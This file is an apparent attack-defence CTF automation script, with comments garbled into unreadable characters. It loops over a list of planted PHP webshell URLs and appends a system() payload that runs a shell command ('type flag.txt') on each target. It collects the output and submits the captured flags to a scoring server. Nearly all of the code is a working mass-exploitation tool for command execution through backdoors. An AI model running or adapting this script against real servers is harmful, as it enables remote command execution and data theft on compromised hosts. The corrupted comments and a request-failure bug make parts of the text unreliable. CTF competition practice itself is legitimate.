#!/usr/bin/python
#coding=utf-8
import sys,requests,base64,time

#����һ�仰ľ��õ�flag

#����һ�仰��ַ���ļ�
def shell_list(filepath):
    #��ʽ http://192.168.174.128/test.php?x=
    #�����б�
    try : 
        with open(filepath,encoding='utf-8') as f:
            data = f.readlines()
            return data
    except : 
        print("File"+filepath+" Not Found!") 
        sys.exit()
    
def getflag(filepath):
    file = './flag'+str(time.time())[-5:]+'.txt'
    #����shell��ַ
    list = shell_list(filepath)
    #���� ִ�в鿴flag����  linux����cat
    cmd = "type flag.txt"
    getflag_cmd ="echo system(\"%s\");"%cmd
    for url in list:
        url  = url.strip('\r\n') + getflag_cmd
        try:
            res = requests.get(url=url,timeout=5)
        except:
            print(url+"[ - ] request timeout [ - ]")
        if res.content:
            content = str(res.content,'utf-8')
            try : 
            #�ѵõ���flag�浽flag�ļ��������ύ
                with open(file,'a',encoding='utf-8') as f:
                    f.writelines(content+"\n")
            except : 
                 print("дflag.txt�ļ�ʧ�ܣ���")
                 sys.exit()
    print("[+] getflag sucessed! flag�ļ�:" +file)
    return file

#�����ύflag
def sentflag(filepath,url):
    filename = getflag(filepath)#���ش��flag�ĵ�ַ
    #��ȡ���flag�ļ�
    with open(filename,'r',encoding='utf-8') as f:
        flags = f.readlines()
        for flag in flags:
            links = url + flag.strip('\n')
            try : 
                res = requests.get(url=links,timeout=3)
                if res.status_code==200 :
                    print("[ + ] Send Flag  %s Success [ + ]") % flag
            except : 
                 print("[ - ] Send Flag Failed [ - ]")
                 sys.exit()
            
           
#��һ��������Ҫһ�����shell�ĵ�ַ����ʽ http://192.168.174.128/test.php?x=    
#�ڶ���������Ҫ�ύflag�ĵ�ַ ����http://1.1.1.1/submit.php?token=xxxx&flag=xxxxx
filepath = './webshell.txt'
url = 'http://1.1.1.1/submit.php?token=xxxx&flag=xxxxx'
sentflag(filepath,url)